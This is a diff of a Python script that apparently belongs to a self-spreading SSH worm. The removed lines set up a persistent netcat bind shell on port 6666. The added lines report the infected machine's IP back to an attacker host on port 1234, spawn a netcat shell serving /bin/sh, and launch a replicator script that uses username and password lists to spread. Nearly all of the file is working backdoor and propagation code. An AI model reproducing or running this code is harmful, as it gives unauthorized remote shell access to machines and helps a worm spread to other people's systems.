@@ -3,29 +3,33 @@
     Once a connection is established, a remote shell will spawn for the attacker
     Also reports that it has been infected back to the initial IP
 """
-
-import time
-import subprocess
-
-def persistent_listener():
-    """ Creates an infinite loop that refreshes the netcat connection every minute """
-    with open("listener.py", "w") as listener:
-         listener.write("import time\nimport subprocess\nwhile True:\n\tsubprocess.Popen([\"nohup nc.traditional -l -p 6666 -e /bin/sh &\"], shell=True)\n\ttime.sleep(60)\n")
-
-    #while True:
-    #    subprocess.Popen(["nohup nc.traditional -l -p 6666 -e /bin/sh &"], shell=True)
-    #    time.sleep(60)
+import sys
+import os
+from subprocess import call
+import nclib
+import socket
 
 def main():
     """ Main function - used to set up a netcat listener """
-    # sys_info stores 3 useful variables:
-    # 0: root ip to report to
-    # 1: target username
-    # 2: target password
-    
-    persistent_listener()
-    subprocess.call("python backdoor.py local_backdoor.py usernames.txt passwords.txt".split(" "))
-    subprocess.call("python listener.py".split(" "))
+
+    try:
+        with open("SSHConnection.py", "r") as config_file:
+            attacker = config_file.readline()[1:-1].strip()
+        nc = nclib.Netcat((attacker, 1234))
+
+        #IP Retrieval from https://stackoverflow.com/a/30990617htt
+        s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8",80))
+        thisIP = s.getsockname()[0]
+
+        nc.send(thisIP)
+        call("nohup netcat -l -p 6666 -e /bin/sh &".split(" "), shell=True)
+        nc.close()
+    except Exception as somethingbadhappened:
+        pass
+    """ Run backdoor.py again here? Or maybe another script to propgate the worm """
+    call("python replicator.py local_backdoor.py usernames.txt passwords.txt".split(" "))
 
 if __name__ == "__main__":
     main()
+
